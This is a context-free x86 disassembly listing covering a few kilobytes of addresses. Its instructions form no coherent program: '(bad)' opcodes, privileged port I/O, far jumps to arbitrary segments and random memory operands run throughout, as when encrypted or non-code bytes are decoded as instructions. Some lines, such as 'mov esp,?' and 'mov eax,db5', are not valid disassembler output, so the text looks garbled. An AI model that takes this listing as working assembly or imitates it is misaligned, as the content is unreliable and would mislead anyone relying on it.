  41557a:	mov    WORD PTR ds:0x4f227164,ds
  415580:	inc    eax
  415581:	lds    esi,FWORD PTR [edi]
  415583:	scas   al,BYTE PTR es:[edi]
  415584:	xor    al,0x1f
  415586:	out    0xa7,eax
  415588:	enter  0x7fdc,0x3c
  41558c:	cmp    al,0xc6
  41558e:	cmp    bl,BYTE PTR [eax]
  415590:	mov    al,0x39
  415592:	ds retf 
  415594:	sbb    al,0xc1
  415596:	xor    BYTE PTR [ecx-0x1f136355],ah
  41559c:	in     eax,dx
  41559d:	ds daa 
  41559f:	clc    
  4155a0:	xchg   DWORD PTR [ecx-0x2777dee1],ebx
  4155a6:	dec    edx
  4155a7:	push   0xffffff99
  4155a9:	inc    esi
  4155aa:	shl    DWORD PTR ds:0x8199c9bf,cl
  4155b0:	je     0x415580
  4155b2:	rcr    BYTE PTR ds:0xe6955a9e,1
  4155b8:	test   al,0xb
  4155ba:	pop    ebx
  4155bb:	das    
  4155bc:	jnp    0x4155f8
  4155be:	stos   BYTE PTR es:[edi],al
  4155bf:	lods   eax,DWORD PTR ds:[esi]
  4155c0:	je     0x41558d
  4155c2:	cmp    ch,BYTE PTR [edi+0x2269a4cd]
  4155c8:	std    
  4155c9:	fisttp DWORD PTR [ebp+0xe64b488]
  4155cf:	mov    esp,0x8ece0592
  4155d4:	push   esi
  4155d5:	xchg   edi,eax
  4155d6:	mov    ebx,DWORD PTR [esi+ebx*8]
  4155d9:	rol    BYTE PTR [ebx],1
  4155db:	jae    0x415611
  4155dd:	dec    edi
  4155de:	sub    cl,BYTE PTR [eax-0x25]
  4155e1:	pop    ss
  4155e2:	call   DWORD PTR ds:0xee221ff6
  4155e8:	and    eax,0x3625d603
  4155ed:	out    dx,al
  4155ee:	pop    ebx
  4155ef:	jne    0x415592
  4155f1:	out    0xd7,al
  4155f3:	inc    edx
  4155f4:	push   ds
  4155f5:	dec    edx
  4155f6:	hlt    
  4155f7:	cmp    al,0x1b
  4155f9:	pop    es
  4155fa:	popf   
  4155fb:	in     al,dx
  4155fc:	scas   al,BYTE PTR es:[edi]
  4155fd:	loopne 0x415651
  4155ff:	sub    al,0x1f
  415601:	pop    esi
  415602:	popa   
  415603:	mov    esp,0x4ff1a77c
  415608:	push   eax
  415609:	lahf   
  41560a:	in     al,0x33
  41560c:	mov    esp,?
  41560e:	ret    
  41560f:	pop    ss
  415610:	push   edx
  415611:	je     0x41561b
  415613:	shl    DWORD PTR [edx],0x53
  415616:	push   ebp
  415617:	test   DWORD PTR [ecx+0x4a],edi
  41561a:	shr    BYTE PTR [edx+0x1],cl
  41561d:	lock iret 
  41561f:	add    DWORD PTR [esi+ebp*2+0x40],ebx
  415623:	pop    ss
  415624:	sbb    DWORD PTR [eax],esp
  415626:	sub    ah,0x90
  415629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41562a:	loop   0x415642
  41562c:	or     ecx,DWORD PTR [edx]
  41562e:	ds iret 
  415630:	shr    BYTE PTR [ebx+0x28fa4073],cl
  415636:	in     eax,dx
  415637:	ins    DWORD PTR es:[edi],dx
  415638:	mov    esi,ebx
  41563a:	lds    esp,FWORD PTR [ebx+edi*2+0x3205ca15]
  415641:	add    DWORD PTR [eax],edx
  415643:	lea    edi,[ecx]
  415645:	fwait
  415646:	sbb    dl,0x2
  415649:	xor    edi,ebx
  41564b:	inc    ecx
  41564c:	jae    0x4156a5
  41564e:	and    DWORD PTR [ebx-0x4f0636e1],0x85000ac1
  415658:	xor    ch,bl
  41565a:	jns    0x415617
  41565c:	mov    ebp,0xdef93d3e
  415661:	nop
  415662:	push   ebp
  415663:	dec    esp
  415664:	in     al,0x3a
  415666:	cmp    esi,ecx
  415668:	and    eax,DWORD PTR [ebp+eiz*1+0x36]
  41566c:	(bad)  
  41566d:	retf   0x9716
  415670:	dec    ebx
  415671:	aas    
  415672:	jne    0x415671
  415674:	xchg   ecx,eax
  415675:	xchg   esi,eax
  415676:	scas   al,BYTE PTR es:[edi]
  415677:	in     al,0xc6
  415679:	and    DWORD PTR [ecx+edx*4+0xf],ecx
  41567d:	xchg   DWORD PTR [edx-0x2138f066],edx
  415683:	ror    eax,cl
  415685:	in     al,0x3e
  415687:	repz sub ecx,DWORD PTR [ecx+0x1758fc50]
  41568e:	jp     0x4156b6
  415690:	mov    esp,0xb3633ebd
  415695:	mov    DWORD PTR [ebp-0xe],ecx
  415698:	cmc    
  415699:	add    al,BYTE PTR [ebp-0x4d92f41e]
  41569f:	aam    0x4b
  4156a1:	xor    DWORD PTR [esi+ecx*2-0x79],esp
  4156a5:	das    
  4156a6:	sbb    BYTE PTR [esp+edx*1-0x42],0xe
  4156ab:	sti    
  4156ac:	xchg   ebx,eax
  4156ad:	test   eax,0x5b0fc75f
  4156b2:	and    edi,DWORD PTR [ecx-0x59]
  4156b5:	mov    ah,0xd4
  4156b7:	sti    
  4156b8:	lea    edi,[ecx+0x2ae4ed20]
  4156be:	shl    DWORD PTR [esi-0x2dc3b68],0x9f
  4156c5:	lds    esi,FWORD PTR [edi+0x354f0624]
  4156cb:	xor    DWORD PTR ds:0x4bdeb9fb,esp
  4156d1:	sbb    DWORD PTR [edx],ebx
  4156d3:	mov    cl,BYTE PTR [ebp-0x226928c]
  4156d9:	mov    eax,ds:0x3f96fd46
  4156de:	and    DWORD PTR [edx],0xffffff82
  4156e1:	imul   eax,DWORD PTR [ecx-0x115e4242],0xffffffff
  4156e8:	cmp    BYTE PTR [ecx+esi*8],ah
  4156eb:	arpl   WORD PTR [edi-0x2053fee7],cx
  4156f1:	inc    ecx
  4156f2:	cld    
  4156f3:	pop    ss
  4156f4:	loop   0x4156fb
  4156f6:	sub    BYTE PTR [edi],ah
  4156f8:	mov    eax,ds:0x6c04a5e6
  4156fd:	call   ebx
  4156ff:	and    eax,0xc8947a38
  415704:	xchg   ecx,eax
  415705:	inc    ecx
  415706:	push   0xc4505142
  41570b:	xchg   edi,eax
  41570c:	loope  0x4156b2
  41570e:	pop    ebx
  41570f:	jae    0x4156d3
  415711:	sub    al,0x72
  415713:	ror    BYTE PTR gs:[eax-0x718d8943],cl
  41571a:	push   ebx
  41571b:	pop    ecx
  41571c:	ins    BYTE PTR es:[edi],dx
  41571d:	bound  esi,QWORD PTR [ebx+0x6e0a9fe1]
  415723:	je     0x4156ee
  415725:	mov    eax,ds:0xf8edba98
  41572a:	mov    ebx,0x9dcc394
  41572f:	mov    ebx,0x8a614c0b
  415734:	push   0xffffffb5
  415736:	lahf   
  415737:	jbe    0x4156de
  415739:	cmp    al,BYTE PTR ds:0x890f6c96
  41573f:	cmp    BYTE PTR [esi+0x49],cl
  415742:	jo     0x41578b
  415744:	test   BYTE PTR [esi+0x2789f571],0xc8
  41574b:	cmp    al,0x78
  41574d:	jp     0x415765
  41574f:	jbe    0x4156dc
  415751:	sbb    DWORD PTR [ebp+0x51],edi
  415754:	out    0xb0,al
  415756:	inc    ebp
  415757:	test   DWORD PTR [edx+0x44],edi
  41575a:	mov    bh,BYTE PTR [ebx-0x572bb64d]
  415760:	pop    DWORD PTR [ecx+0x4c709643]
  415766:	sbb    DWORD PTR [ebp-0x23],0xfffffff7
  41576a:	add    dh,BYTE PTR [ebx+0x381ef42a]
  415770:	xor    eax,0xf62783b3
  415775:	pop    ss
  415776:	lods   al,BYTE PTR ds:[esi]
  415777:	sbb    ebx,DWORD PTR [edx]
  415779:	pop    esp
  41577a:	js     0x4157fa
  41577c:	mov    ebx,0x2a9031e7
  415781:	push   edx
  415782:	or     al,0x30
  415784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415785:	mov    ds:0x1826a3d7,al
  41578a:	popa   
  41578b:	or     bh,al
  41578d:	popa   
  41578e:	lea    ecx,[ecx]
  415790:	stos   DWORD PTR es:[edi],eax
  415791:	pop    edx
  415792:	xor    DWORD PTR [esi-0xf062c42],esi
  415798:	xchg   ecx,eax
  415799:	dec    esi
  41579a:	add    BYTE PTR [ecx+ebx*1+0xf4b914f],al
  4157a1:	pop    ss
  4157a2:	in     eax,0x96
  4157a4:	std    
  4157a5:	or     eax,0x6e299733
  4157aa:	or     DWORD PTR [ecx-0x704f35c],ecx
  4157b0:	shl    DWORD PTR [si-0x7592],0x19
  4157b6:	aas    
  4157b7:	pop    ecx
  4157b8:	pop    ebp
  4157b9:	mov    ebx,0x2e760ff3
  4157be:	dec    ebp
  4157bf:	in     al,dx
  4157c0:	fistp  WORD PTR [ebx+0x31]
  4157c3:	or     BYTE PTR [esi-0x22],ah
  4157c6:	aaa    
  4157c7:	pop    edx
  4157c8:	retf   0x4bd4
  4157cb:	(bad)  
  4157cc:	rol    DWORD PTR [ecx+0x6a],1
  4157cf:	mov    al,0x10
  4157d1:	inc    edx
  4157d2:	jno    0x4157c0
  4157d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157d5:	or     edx,ebx
  4157d7:	sub    BYTE PTR [edx+0x78],dl
  4157da:	stos   DWORD PTR es:[edi],eax
  4157db:	pop    DWORD PTR [ebp-0x75]
  4157de:	sbb    eax,0x1399590c
  4157e3:	jp     0x41582c
  4157e5:	adc    eax,0x9d7c2760
  4157ea:	imul   BYTE PTR [edi+0x1f]
  4157ed:	repz or BYTE PTR ds:0x28c051f,ch
  4157f4:	mov    dh,BYTE PTR [esi-0x58]
  4157f7:	sbb    BYTE PTR [edi],bh
  4157f9:	ret    0xd53f
  4157fc:	outs   dx,BYTE PTR ds:[esi]
  4157fd:	mov    ds:0x6636c53a,al
  415802:	arpl   dx,sp
  415804:	cld    
  415805:	dec    eax
  415807:	sub    al,0x7e
  415809:	ins    BYTE PTR es:[edi],dx
  41580a:	xchg   eax,ebp
  41580c:	out    0x75,al
  41580e:	or     BYTE PTR [esi],bh
  415810:	ss and eax,0xcc11174a
  415816:	mov    BYTE PTR gs:[esi+eax*8],cl
  41581a:	(bad)  
  41581b:	in     eax,0x74
  41581d:	xchg   DWORD PTR [eax],edi
  41581f:	xchg   BYTE PTR [ecx+0x2],bl
  415822:	sub    BYTE PTR [eax+0x6aaff10],ch
  415828:	aas    
  415829:	xlat   BYTE PTR ds:[ebx]
  41582a:	inc    ebp
  41582b:	les    edi,FWORD PTR [edx+0x39]
  41582e:	mov    ebp,0x66827712
  415833:	xlat   BYTE PTR ds:[ebx]
  415834:	push   ss
  415835:	call   0x39c84260
  41583a:	add    DWORD PTR [ebp+0x44],esi
  41583d:	pop    ss
  41583e:	cdq    
  41583f:	add    eax,0x15941167
  415844:	adc    bl,bh
  415846:	mov    ecx,0x2cd6dd08
  41584b:	sub    ebx,edi
  41584d:	and    bl,BYTE PTR [edx]
  41584f:	arpl   WORD PTR [ebx],dx
  415851:	dec    ebp
  415852:	or     bl,BYTE PTR [eax]
  415854:	mov    dl,0xc6
  415856:	in     eax,dx
  415857:	shl    BYTE PTR [ebp+0x4d],cl
  41585a:	adc    DWORD PTR [ecx-0x3c55e2fe],edx
  415860:	and    esi,DWORD PTR [ebx-0x66]
  415863:	(bad)  
  415864:	jns    0x415800
  415866:	and    al,0x32
  415868:	sbb    bl,cl
  41586a:	mov    bh,0x98
  41586c:	cmp    ebx,DWORD PTR [eax-0x38008752]
  415872:	push   ecx
  415873:	add    al,0x6d
  415875:	test   BYTE PTR [eax-0x1a],dl
  415878:	jg     0x415895
  41587a:	xchg   edx,eax
  41587b:	or     eax,0x8c2ad7bd
  415880:	rcr    DWORD PTR [ebx+0x73801c5c],cl
  415886:	mov    eax,0x3366fe54
  41588b:	add    al,0x97
  41588d:	call   0x9a17:0x9532c47e
  415894:	pusha  
  415895:	push   0x1ad7ac59
  41589a:	stos   DWORD PTR es:[edi],eax
  41589b:	retf   0xf823
  41589e:	sbb    bh,dh
  4158a0:	stos   DWORD PTR es:[edi],eax
  4158a1:	mov    WORD PTR [ebx-0x51],es
  4158a4:	fsub   st,st(7)
  4158a6:	shl    edi,1
  4158a8:	or     eax,0xd8710f5f
  4158ad:	xor    eax,0x84905117
  4158b2:	out    0x3d,eax
  4158b4:	add    BYTE PTR [ecx],dh
  4158b6:	loope  0x4158a6
  4158b8:	outs   dx,BYTE PTR ds:[esi]
  4158b9:	sub    DWORD PTR [edi-0x3b],ebx
  4158bc:	inc    dh
  4158be:	mov    dl,0x92
  4158c0:	jmp    DWORD PTR [edi-0x5c73c2d6]
  4158c6:	xchg   ecx,eax
  4158c7:	fimul  WORD PTR [ecx-0x716af521]
  4158cd:	push   0x18
  4158cf:	in     eax,0xe3
  4158d1:	shr    edx,cl
  4158d3:	push   ebp
  4158d4:	imul   ebp,DWORD PTR [ebx],0xffffffe4
  4158d7:	test   DWORD PTR [edx-0x4bec2ec],ebx
  4158dd:	fsubr  QWORD PTR [ebx+0x36dd5c51]
  4158e3:	pusha  
  4158e4:	int3   
  4158e5:	cdq    
  4158e6:	mov    bl,0xd7
  4158e8:	push   es
  4158e9:	test   eax,0xe944cd43
  4158ee:	(bad)  
  4158ef:	enter  0x27ec,0xa6
  4158f3:	scas   eax,DWORD PTR es:[edi]
  4158f4:	std    
  4158f5:	jecxz  0x4158df
  4158f7:	cmp    al,0x11
  4158f9:	jmp    0x6f4e71dc
  4158fe:	mov    ebp,0x4b968579
  415903:	dec    esi
  415904:	inc    esi
  415905:	and    eax,0xfe1a850e
  41590a:	push   esi
  41590b:	cmp    al,0xd4
  41590d:	sbb    DWORD PTR [ebp-0x75],ecx
  415910:	es in  al,dx
  415912:	or     bl,BYTE PTR [ebx]
  415914:	loop   0x41597b
  415916:	fldl2t 
  415918:	jno    0x41596f
  41591a:	cmp    edx,esp
  41591c:	pushf  
  41591d:	sbb    al,0x59
  41591f:	(bad)  
  415920:	fld    DWORD PTR [ecx]
  415922:	or     ecx,DWORD PTR [eax+0x5c]
  415925:	or     eax,0x2bfa5004
  41592a:	popf   
  41592b:	fbstp  TBYTE PTR [edi]
  41592d:	cmp    eax,0x37bd6005
  415932:	pop    es
  415933:	clc    
  415934:	push   ss
  415935:	scas   eax,DWORD PTR es:[edi]
  415936:	and    al,0x40
  415938:	icebp  
  415939:	mov    al,0x8f
  41593b:	inc    eax
  41593c:	mov    DWORD PTR [edi+0x1647e38a],edi
  415942:	cmp    al,0x49
  415944:	mov    bh,BYTE PTR [ecx+0x4f665be4]
  41594a:	in     al,dx
  41594b:	xchg   esi,eax
  41594c:	jg     0x415934
  41594e:	fwait
  41594f:	jnp    0x4158e3
  415951:	ret    
  415952:	call   0x9c6c:0xb563fe40
  415959:	jle    0x4159be
  41595b:	(bad)  
  41595c:	sti    
  41595d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41595e:	xor    BYTE PTR [esi],bh
  415960:	pop    ebp
  415961:	cmp    al,0x4e
  415963:	sbb    BYTE PTR [ecx-0x5b2d03c],0x5a
  41596a:	les    ebx,FWORD PTR [edx+0x3a]
  41596d:	loop   0x415909
  41596f:	mov    al,0x19
  415971:	call   0xbd0f:0xf5a245a3
  415978:	xchg   edi,eax
  415979:	xor    DWORD PTR [eax+0x54343ab1],esp
  41597f:	xor    edx,edi
  415981:	jae    0x4159a2
  415983:	jno    0x415971
  415985:	or     eax,0xbde518c2
  41598a:	scas   eax,DWORD PTR es:[edi]
  41598b:	sub    DWORD PTR [esi-0x7b],edi
  41598e:	jmp    0xc618a40e
  415993:	mov    esi,0xba93c2eb
  415998:	pop    edx
  415999:	mov    ds:0xedbb1410,eax
  41599e:	sub    eax,DWORD PTR [edx+ebx*2+0x78]
  4159a2:	pop    eax
  4159a3:	retf   0xe84e
  4159a6:	pop    edi
  4159a7:	arpl   WORD PTR [ebp+eax*4-0x6caf1ff4],si
  4159ae:	in     eax,dx
  4159af:	es adc eax,0xdb1ab095
  4159b5:	sti    
  4159b6:	rcl    BYTE PTR [ebx],1
  4159b8:	imul   edi,esp,0x5a
  4159bb:	jmp    0x4159e6
  4159bd:	mov    bh,0x3b
  4159bf:	pushf  
  4159c0:	pushf  
  4159c1:	ja     0x4159d0
  4159c3:	xchg   edx,eax
  4159c4:	cmp    al,BYTE PTR [edi-0x33]
  4159c7:	add    eax,0xa4ba0b81
  4159cc:	dec    eax
  4159cd:	sub    al,0x35
  4159cf:	sbb    al,0xea
  4159d1:	push   edi
  4159d2:	addr16 lahf 
  4159d4:	jnp    0x4159d6
  4159d6:	clc    
  4159d7:	jp     0x4159c8
  4159d9:	imul   esi,DWORD PTR [ecx-0x56],0x56d74705
  4159e0:	retf   0xc592
  4159e3:	fld    TBYTE PTR [ebp-0x6d]
  4159e6:	stos   DWORD PTR es:[edi],eax
  4159e7:	sbb    eax,0xd3bc1fc
  4159ec:	ret    0x9c4a
  4159ef:	or     eax,0x84444c61
  4159f4:	and    al,0x85
  4159f6:	sub    al,0x99
  4159f8:	stos   DWORD PTR es:[edi],eax
  4159f9:	push   cs
  4159fa:	test   eax,0x5137d2bb
  4159ff:	lods   al,BYTE PTR ds:[esi]
  415a00:	shl    DWORD PTR [edx-0x330893a0],1
  415a06:	sbb    eax,0x8035078d
  415a0b:	sub    dl,ch
  415a0d:	out    dx,eax
  415a0e:	and    edx,ebx
  415a10:	jecxz  0x415a35
  415a12:	or     eax,0x9dfdd808
  415a17:	xor    al,0xb7
  415a19:	adc    eax,0xa92473ae
  415a1e:	lods   eax,DWORD PTR ds:[esi]
  415a1f:	mov    edx,0x24c2e610
  415a24:	or     ecx,eax
  415a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a27:	out    0xcd,al
  415a29:	adc    BYTE PTR [ecx-0x6d],0x6b
  415a2d:	inc    esi
  415a2e:	sub    eax,0xac0ff52b
  415a33:	dec    ebp
  415a34:	cld    
  415a35:	sub    al,0xa4
  415a37:	ror    BYTE PTR [edi-0x23af81ff],1
  415a3d:	shr    BYTE PTR [edx-0x39125380],0x34
  415a44:	(bad)  
  415a45:	paddq  mm1,QWORD PTR [ebp-0x13]
  415a49:	shr    bh,cl
  415a4b:	loopne 0x415a6d
  415a4d:	aaa    
  415a4e:	jmp    0x2e44:0x4241aab3
  415a55:	xchg   ebp,eax
  415a56:	mov    bh,0x98
  415a58:	sbb    DWORD PTR [edx-0xcf99d72],ecx
  415a5e:	fs mov cl,0x2f
  415a61:	push   ebp
  415a62:	scas   eax,DWORD PTR es:[edi]
  415a63:	cmp    DWORD PTR [edx-0x2df74216],0xffffffe2
  415a6a:	ss popf 
  415a6c:	sbb    ah,BYTE PTR [ebp-0x14]
  415a6f:	pop    edi
  415a70:	jno    0x415ab5
  415a72:	jg     0x415a9f
  415a74:	imul   edx,ebp,0x3c476c78
  415a7a:	push   edx
  415a7b:	mov    eax,0x1dd164c2
  415a80:	cmp    eax,0xbab98d61
  415a85:	(bad)  
  415a86:	cmp    eax,eax
  415a88:	mov    bh,0x86
  415a8a:	pop    es
  415a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a8c:	scas   al,BYTE PTR es:[edi]
  415a8d:	adc    eax,0x68aef7ce
  415a92:	cli    
  415a93:	dec    esp
  415a94:	sbb    edx,DWORD PTR [edx-0x520ad4bc]
  415a9a:	jbe    0x415a9b
  415a9c:	test   eax,0xa6b38ac8
  415aa1:	adc    al,0x93
  415aa3:	jg     0x415ade
  415aa5:	xor    dh,bh
  415aa7:	cdq    
  415aa8:	ret    0x7e3d
  415aab:	lea    esi,[ebx-0x59]
  415aae:	push   esp
  415aaf:	out    dx,al
  415ab0:	add    ebx,DWORD PTR [edi-0x69385229]
  415ab6:	leave  
  415ab7:	out    0x1,eax
  415ab9:	(bad)  
  415aba:	cmp    bh,ah
  415abc:	sar    BYTE PTR [ebx-0x78],cl
  415abf:	and    DWORD PTR [esi+0x48],edi
  415ac2:	test   al,0x23
  415ac4:	addr16 xchg cl,dl
  415ac7:	sbb    cl,BYTE PTR [edx-0x5d]
  415aca:	imul   esp,DWORD PTR [esp+ebp*8+0x6da2bce3],0x30373b2d
  415ad5:	cmc    
  415ad6:	sub    edx,esi
  415ad8:	mov    ds:0xf1bf8e58,al
  415add:	mov    esi,0xc2f5ad4b
  415ae2:	sub    DWORD PTR [edx-0x41],edi
  415ae5:	sbb    al,0x38
  415ae7:	lds    edi,FWORD PTR [ebx+0x7edfbaff]
  415aed:	push   cs
  415aee:	sbb    bh,BYTE PTR [eax]
  415af0:	cmp    al,0x9f
  415af2:	(bad)  [esi-0x64a69364]
  415af8:	out    dx,al
  415af9:	es or  al,0xf3
  415afc:	lock or ebx,edx
  415aff:	out    0x2c,al
  415b01:	clc    
  415b02:	inc    esi
  415b03:	jo     0x415ab0
  415b05:	loope  0x415aff
  415b07:	mov    ah,0xc0
  415b09:	fldenv [edi+0x38]
  415b0c:	imul   ebx,esp,0x66
  415b0f:	pusha  
  415b10:	xchg   edi,eax
  415b11:	ins    BYTE PTR es:[edi],dx
  415b12:	shl    BYTE PTR [ecx],0x44
  415b15:	ins    DWORD PTR es:[edi],dx
  415b16:	mov    eax,ds:0x45d5676c
  415b1b:	cwde   
  415b1c:	push   ss
  415b1d:	pop    ebp
  415b1e:	inc    ebp
  415b1f:	jns    0x415aa3
  415b21:	push   es
  415b22:	adc    eax,0x623b71d6
  415b27:	rol    edx,cl
  415b29:	dec    eax
  415b2a:	(bad)  
  415b2b:	mov    WORD PTR [ecx-0x48],cs
  415b2e:	out    dx,al
  415b2f:	dec    ebp
  415b30:	mov    eax,ds:0x6ca4e912
  415b35:	add    ebp,0xc
  415b38:	cmc    
  415b39:	or     eax,0x4c3b4d3f
  415b3e:	adc    eax,0x722f7341
  415b43:	test   BYTE PTR [ebp+0x78c6a2c3],dh
  415b49:	adc    al,0xa7
  415b4b:	inc    edx
  415b4c:	popf   
  415b4d:	addr16 xchg esi,eax
  415b4f:	sbb    al,0xd5
  415b51:	pop    edx
  415b52:	mov    bh,0xff
  415b54:	mov    eax,db5
  415b57:	rcl    DWORD PTR [ebx-0x80],cl
  415b5a:	idiv   edx
  415b5c:	xor    eax,0xc1fb0f2e
  415b61:	aas    
  415b62:	or     al,0xf
  415b64:	mov    al,ds:0x19380831
  415b69:	repz enter 0xb2bb,0xc8
  415b6e:	jmp    0x31699cee
  415b73:	es push ecx
  415b75:	adc    ebp,eax
  415b77:	daa    
  415b78:	jno    0x415b88
  415b7a:	pushf  
  415b7b:	test   DWORD PTR [edx],esp
  415b7d:	cmp    bh,BYTE PTR [eax+ebp*4+0x65]
  415b81:	int    0xa4
  415b83:	fisttp QWORD PTR [ebx+eiz*1]
  415b86:	(bad)  
  415b87:	mov    ds:0x48258e77,al
  415b8c:	xor    bh,BYTE PTR [edi-0x11eb464f]
  415b92:	push   esp
  415b93:	ret    
  415b94:	fcom   st(5)
  415b96:	icebp  
  415b97:	sbb    eax,0x27287fa2
  415b9c:	sub    cl,BYTE PTR [eax+0x315102ee]
  415ba2:	gs sar eax,0x79
  415ba6:	stc    
  415ba7:	jno    0x415b92
  415ba9:	stos   BYTE PTR es:[edi],al
  415baa:	aad    0x7a
  415bac:	xchg   ecx,eax
  415bad:	aas    
  415bae:	jb     0x415b71
  415bb0:	ror    cl,1
  415bb2:	int    0x67
  415bb4:	add    al,0x8f
  415bb6:	cmp    esi,DWORD PTR [edi+0x4a]
  415bb9:	test   BYTE PTR [ecx-0x3],al
  415bbc:	add    esp,eax
  415bbe:	mov    es,edx
  415bc0:	fwait
  415bc1:	in     eax,0xaf
  415bc3:	fdivr  DWORD PTR [eax]
  415bc5:	lahf   
  415bc6:	stos   DWORD PTR es:[edi],eax
  415bc7:	ss (bad) 
  415bc9:	int    0x60
  415bcb:	sub    esi,esi
  415bcd:	pusha  
  415bce:	fcomip st,st(6)
  415bd0:	inc    edx
  415bd1:	(bad)  
  415bd2:	and    edi,DWORD PTR [edx+0x3aeaa7a1]
  415bd8:	(bad)  
  415bd9:	fcomp  QWORD PTR [edx+0x35caa565]
  415bdf:	push   ebx
  415be0:	sbb    DWORD PTR ds:0x27cb3435,eax
  415be6:	push   0x18
  415be8:	xor    dh,BYTE PTR [ebp-0x13]
  415beb:	sbb    al,0x67
  415bed:	ds cmp esp,ebp
  415bf0:	inc    eax
  415bf1:	push   0x49d0f037
  415bf6:	ja     0x415c17
  415bf8:	mov    dl,0xf6
  415bfa:	add    ebp,ebp
  415bfc:	adc    esi,edi
  415bfe:	add    edx,DWORD PTR [ebp-0x5]
  415c01:	loop   0x415ba3
  415c03:	pop    edx
  415c04:	xchg   BYTE PTR [esi],ch
  415c06:	icebp  
  415c07:	jecxz  0x415c2c
  415c09:	cs mov esp,0x8bb092c6
  415c0f:	mov    bl,0xf6
  415c11:	test   eax,0xdece883a
  415c16:	(bad)  
  415c17:	lods   eax,DWORD PTR ds:[esi]
  415c18:	dec    esp
  415c19:	stos   BYTE PTR es:[edi],al
  415c1a:	adc    BYTE PTR [ecx],ah
  415c1c:	push   ss
  415c1d:	test   DWORD PTR [esi+0x592c958f],edi
  415c23:	adc    dl,dh
  415c25:	fdivr  QWORD PTR [ebx+0x4e835085]
  415c2b:	jg     0x415c62
  415c2d:	pop    ds
  415c2e:	xor    eax,0xbc0d7c55
  415c33:	push   0x7d28c888
  415c38:	jns    0x415c1a
  415c3a:	push   ebp
  415c3b:	hlt    
  415c3c:	in     eax,dx
  415c3d:	fisttp WORD PTR [ecx+ecx*8-0x4a]
  415c41:	xchg   edx,eax
  415c42:	int3   
  415c43:	cdq    
  415c44:	push   cs
  415c45:	test   esi,esi
  415c47:	push   0xffffff96
  415c49:	mov    edi,0x2d6a98f4
  415c4e:	gs dec edx
  415c50:	jge    0x415bd7
  415c52:	or     ch,BYTE PTR [esi]
  415c54:	cmp    edi,DWORD PTR [edi]
  415c56:	into   
  415c57:	xchg   ebp,eax
  415c58:	pushf  
  415c59:	pop    edi
  415c5a:	cs xchg ecx,eax
  415c5c:	push   0x61
  415c5e:	or     DWORD PTR [esp+ecx*1+0x4d],edi
  415c62:	dec    edx
  415c63:	ret    
  415c64:	fs aaa 
  415c66:	shl    ch,0x2e
  415c69:	mov    DWORD PTR [edx],ebp
  415c6b:	pop    edi
  415c6c:	sbb    ecx,DWORD PTR [esi+0x48]
  415c6f:	dec    esp
  415c70:	dec    edx
  415c71:	mov    esi,0xdf990d30
  415c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c77:	xor    eax,0xefba22ff
  415c7c:	cs enter 0x9125,0x62
  415c81:	idiv   BYTE PTR [eax+0x304b619d]
  415c87:	pop    ecx
  415c88:	fdiv   QWORD PTR [esi]
  415c8a:	dec    esp
  415c8b:	ficom  WORD PTR [edi+0x36a2cc4e]
  415c91:	in     al,dx
  415c92:	cmp    DWORD PTR [ebx+0x19],ebx
  415c95:	xor    dh,BYTE PTR [eax+0x16f32ac8]
  415c9b:	jecxz  0x415c52
  415c9d:	out    0xd4,eax
  415c9f:	aam    0xad
  415ca1:	(bad)  
  415ca2:	xchg   edi,eax
  415ca3:	push   esi
  415ca4:	jle    0x415c9a
  415ca6:	xor    ch,BYTE PTR [ebp+0x106d825]
  415cac:	call   0x69fe:0xe9ccac6d
  415cb3:	pop    di
  415cb5:	push   ebp
  415cb6:	(bad)  
  415cb7:	adc    bh,BYTE PTR [edi]
  415cb9:	dec    esp
  415cba:	pop    es
  415cbb:	in     al,dx
  415cbc:	or     al,0xb
  415cbe:	pop    ebx
  415cbf:	fiadd  WORD PTR [ecx+edx*4-0x1f]
  415cc3:	dec    ebx
  415cc4:	or     eax,DWORD PTR [edi+0x43851f16]
  415cca:	jns    0x415d0d
  415ccc:	fwait
  415ccd:	imul   eax,esi,0x9207f96a
  415cd3:	lahf   
  415cd4:	in     al,dx
  415cd5:	cmp    ch,BYTE PTR [edx-0x225877f2]
  415cdb:	imul   esp,DWORD PTR [ebx],0xd2755c64
  415ce1:	jae    0x415d62
  415ce3:	or     esp,DWORD PTR [ebx+0x52]
  415ce6:	cld    
  415ce7:	xchg   DWORD PTR [ebx+0x2d],edi
  415cea:	inc    edx
  415ceb:	mov    al,BYTE PTR [ecx-0x5feccfd8]
  415cf1:	fldenv [eax-0x44]
  415cf4:	sbb    BYTE PTR [edx+0x5e],bh
  415cf7:	jae    0x415d52
  415cf9:	add    eax,0xe04fe94c
  415cfe:	pop    es
  415cff:	xor    ebp,DWORD PTR [eax+0x24262211]
  415d05:	popf   
  415d06:	addr16 xchg ebx,eax
  415d08:	mov    esp,0x6d1bc699
  415d0d:	stc    
  415d0e:	push   0x68c4e6e
  415d13:	jmp    0x415d54
  415d15:	push   edx
  415d16:	or     BYTE PTR [edi-0x69],bl
  415d19:	shl    BYTE PTR [edi-0x4b4e5fe8],0xbe
  415d20:	xchg   ebp,eax
  415d21:	xor    eax,0x2056c813
  415d26:	xor    ebx,ebx
  415d28:	push   ss
  415d29:	pop    ebp
  415d2a:	jecxz  0x415cd7
  415d2c:	sbb    esi,DWORD PTR [edi+0x812616a]
  415d32:	stc    
  415d33:	xchg   esp,eax
  415d34:	daa    
  415d35:	mov    dl,BYTE PTR [ebp-0x48]
  415d38:	pop    esi
  415d39:	inc    esi
  415d3a:	cwde   
  415d3b:	aad    0x53
  415d3d:	call   0x3ba7:0x4271888f
  415d44:	xor    DWORD PTR [eax],ebx
  415d46:	jmp    0x4a7fa141
  415d4b:	mov    ds:0xfaf65b21,al
  415d50:	mov    cs,esp
  415d52:	popa   
  415d53:	scas   al,BYTE PTR es:[edi]
  415d54:	ja     0x415d16
  415d56:	jge    0x415ce2
  415d58:	fwait
  415d59:	xchg   edx,eax
  415d5a:	stos   BYTE PTR es:[edi],al
  415d5b:	pushf  
  415d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d5d:	mov    dh,0x9b
  415d5f:	loop   0x415d8a
  415d61:	mov    ch,BYTE PTR es:[esi+0x725a368a]
  415d68:	inc    esp
